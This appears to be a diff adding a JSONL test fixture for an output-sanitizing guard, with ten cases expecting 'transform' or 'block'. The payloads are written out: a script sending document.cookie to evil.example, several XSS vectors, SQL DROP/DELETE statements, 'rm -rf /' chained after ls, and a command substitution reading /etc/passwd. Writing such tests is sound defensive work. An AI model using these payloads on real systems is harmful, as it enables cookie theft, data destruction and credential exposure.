@@ -1,0 +1,10 @@
+{"name": "script", "request": {"output": "<script>fetch('https://evil.example?c='+document.cookie)</script>"}, "expect": ["transform"]}
+{"name": "onerror", "request": {"output": "<img src=x onerror=alert(1)>"}, "expect": ["transform"]}
+{"name": "js-url", "request": {"output": "[click](javascript:alert(1))", "params": {"downstream": "markdown"}}, "expect": ["transform"]}
+{"name": "iframe", "request": {"output": "<iframe src=\"https://evil.example\"></iframe>"}, "expect": ["transform"]}
+{"name": "svg", "request": {"output": "<svg onload=alert(1)>"}, "expect": ["transform"]}
+{"name": "sql-multi", "request": {"output": "SELECT 1; DROP TABLE users", "params": {"downstream": "sql"}}, "expect": ["block"]}
+{"name": "sql-drop", "request": {"output": "DROP TABLE orders", "params": {"downstream": "sql"}}, "expect": ["block"]}
+{"name": "sql-delete-all", "request": {"output": "DELETE FROM orders;", "params": {"downstream": "sql"}}, "expect": ["block"]}
+{"name": "shell-chain", "request": {"output": "ls && rm -rf /", "params": {"downstream": "shell"}}, "expect": ["block"]}
+{"name": "shell-subst", "request": {"output": "echo $(cat /etc/passwd)", "params": {"downstream": "shell"}}, "expect": ["block"]}
